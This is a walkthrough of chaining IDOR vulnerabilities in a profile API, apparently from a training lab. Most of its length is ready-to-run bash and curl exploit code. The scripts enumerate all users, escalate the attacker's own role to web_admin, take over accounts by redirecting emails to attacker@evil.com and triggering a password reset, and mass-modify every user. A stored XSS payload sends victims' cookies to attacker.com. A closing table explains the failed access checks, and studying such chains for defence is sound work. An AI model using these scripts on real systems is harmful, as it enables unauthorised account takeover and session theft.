# Chaining IDOR Vulnerabilities

This attack chain demonstrates how a read-only IDOR that appears low severity becomes a full application takeover when its output feeds into a write operation IDOR. Neither vulnerability alone achieves the end goal. Combined, they bypass every access control the application has. 

***

## The Full Chain Visualised

```
Step 1: GET /api/profile/1    → your own uuid (known baseline)
Step 2: GET /api/profile/2..N → other users' uuids + role names (info disclosure IDOR)
Step 3: Find admin user       → role="web_admin" discovered
Step 4: PUT /api/profile/1    → set your own role to "web_admin" (function call IDOR)
Step 5: Refresh cookie        → role=web_admin now accepted
Step 6: POST /api/profile/    → create/delete users as admin
Step 7: PUT /api/profile/2..N → mass-modify all users' data
```

Each step is only possible because of the previous one. The GET IDOR provides the uuid that unlocks the PUT, and the PUT against your own profile escalates privilege to unlock admin functions.

***

## Phase 1: Enumerate All Users via GET IDOR

```bash
#!/bin/bash

TARGET="http://target.com/profile/api.php/profile"
COOKIE="role=employee; session=YOUR_TOKEN"

echo "[*] Enumerating users..."

for uid in {1..50}; do
    response=$(curl -s -X GET "$TARGET/$uid" \
               -H "Cookie: $COOKIE")
    
    # Skip empty or error responses
    if ! echo "$response" | grep -q '"uuid"'; then
        continue
    fi
    
    # Parse fields
    uuid=$(echo "$response" | grep -oP '"uuid"\s*:\s*"\K[^"]+')
    role=$(echo "$response" | grep -oP '"role"\s*:\s*"\K[^"]+')
    name=$(echo "$response" | grep -oP '"full_name"\s*:\s*"\K[^"]+')
    email=$(echo "$response" | grep -oP '"email"\s*:\s*"\K[^"]+')
    
    echo "[+] UID $uid | Role: $role | Name: $name | UUID: $uuid"
    
    # Flag admin accounts immediately
    if [ "$role" != "employee" ]; then
        echo "    [!] NON-STANDARD ROLE FOUND: $role"
        echo "        UUID: $uuid"
        echo "        Email: $email"
    fi
    
    # Save all user data for later use
    echo "$response" > "user_${uid}.json"
done
```

This script not only enumerates all users but specifically flags any account with a non-standard role. When it finds `"role": "web_admin"` on the admin account, that role name is now known and can be used in Phase 2.

***

## Phase 2: Escalate Your Own Role

With the admin role name `web_admin` discovered, modify your own profile to assign it to yourself. This only requires your own `uuid`, which you already know:

```bash
# Escalate own role to web_admin
curl -s -X PUT "http://target.com/profile/api.php/profile/1" \
     -H "Content-Type: application/json" \
     -H "Cookie: role=employee; session=YOUR_TOKEN" \
     -d '{
           "uid": 1,
           "uuid": "40f5888b67c748df7efba008e7c2f9d2",
           "role": "web_admin",
           "full_name": "Amy Lindon",
           "email": "a_lindon@employees.htb",
           "about": "escalated"
         }'

# Verify role change took effect
curl -s -X GET "http://target.com/profile/api.php/profile/1" \
     -H "Cookie: role=web_admin; session=YOUR_TOKEN" \
     | python3 -m json.tool
```

Update the cookie to `role=web_admin` in Burp's Cookie Manager or manually in subsequent requests. The session cookie carries the new role to the back-end on every request.

***

## Phase 3: Account Takeover via Email Modification

With another user's `uuid` and write access confirmed, change their email to an attacker-controlled address and trigger a password reset:

```bash
# Step 1: Get target user's current details (from Phase 1 enumeration)
TARGET_UID=2
TARGET_UUID="4a9bd19b3b8676199592a346051f950c"

# Step 2: Change target's email to attacker-controlled address
curl -s -X PUT "http://target.com/profile/api.php/profile/$TARGET_UID" \
     -H "Content-Type: application/json" \
     -H "Cookie: role=web_admin; session=YOUR_TOKEN" \
     -d "{
           \"uid\": $TARGET_UID,
           \"uuid\": \"$TARGET_UUID\",
           \"role\": \"employee\",
           \"full_name\": \"Iona Franklyn\",
           \"email\": \"attacker@evil.com\",
           \"about\": \"modified\"
         }"

# Step 3: Trigger password reset for target user
curl -s -X POST "http://target.com/forgot_password.php" \
     -d "email=attacker@evil.com"

# Password reset link goes to attacker's email → full account takeover
```

***

## Phase 4: Mass User Data Modification

With admin role and all UUIDs from Phase 1, automate modifications across all user accounts:

```bash
#!/bin/bash

# Mass email replacement (e.g. for demonstrating full impact to a client)
TARGET="http://target.com/profile/api.php/profile"
COOKIE="role=web_admin; session=YOUR_TOKEN"
NEW_EMAIL="attacker@evil.com"

for uid in {1..50}; do
    # Load previously saved user data
    if [ ! -f "user_${uid}.json" ]; then continue; fi
    
    uuid=$(cat "user_${uid}.json" | grep -oP '"uuid"\s*:\s*"\K[^"]+')
    role=$(cat "user_${uid}.json" | grep -oP '"role"\s*:\s*"\K[^"]+')
    name=$(cat "user_${uid}.json" | grep -oP '"full_name"\s*:\s*"\K[^"]+')
    about=$(cat "user_${uid}.json" | grep -oP '"about"\s*:\s*"\K[^"]+')
    
    [ -z "$uuid" ] && continue
    
    response=$(curl -s -X PUT "$TARGET/$uid" \
         -H "Content-Type: application/json" \
         -H "Cookie: $COOKIE" \
         -d "{
               \"uid\": $uid,
               \"uuid\": \"$uuid\",
               \"role\": \"$role\",
               \"full_name\": \"$name\",
               \"email\": \"$NEW_EMAIL\",
               \"about\": \"$about\"
             }")
    
    echo "[+] UID $uid ($name): $response"
done
```

***

## XSS via IDOR (Stored XSS Chain)

The `about` field being stored and rendered in other users' browsers creates a stored XSS vector accessible through the same IDOR chain: 

```bash
XSS_PAYLOAD='<script>document.location="http://attacker.com/steal?c="+document.cookie</script>'

# Plant XSS payload in admin's about field using their uuid
curl -s -X PUT "http://target.com/profile/api.php/profile/ADMIN_UID" \
     -H "Content-Type: application/json" \
     -H "Cookie: role=web_admin; session=YOUR_TOKEN" \
     -d "{
           \"uid\": ADMIN_UID,
           \"uuid\": \"ADMIN_UUID\",
           \"role\": \"web_admin\",
           \"full_name\": \"administrator\",
           \"email\": \"webadmin@employees.htb\",
           \"about\": \"$XSS_PAYLOAD\"
         }"

# When any user views the admin's profile, their session cookie is sent to attacker.com
```

***

## Why the Chain Works

Each IDOR check the application implemented only considered one dimension of the problem: 

| Check Present | What it Blocks | What it Misses |
|--------------|---------------|----------------|
| `uid mismatch` check on PUT | Sending wrong uid in body | GET still returns any uid's data |
| `uuid mismatch` check on PUT | Random PUT to other users | UUID leaked via GET IDOR |
| `Invalid role` check on PUT | Unknown role names | Role names leaked via GET IDOR |
| Admin-only check on POST/DELETE | Non-admin role cookie | Role cookie is client-controlled |

The application implemented four separate access controls, each of which would be meaningful in isolation. But because GET had no access control at all, every piece of information needed to bypass the other four checks was freely available. This is the core lesson of chained IDOR: partial access control that leaks the inputs required to bypass it provides no real protection.
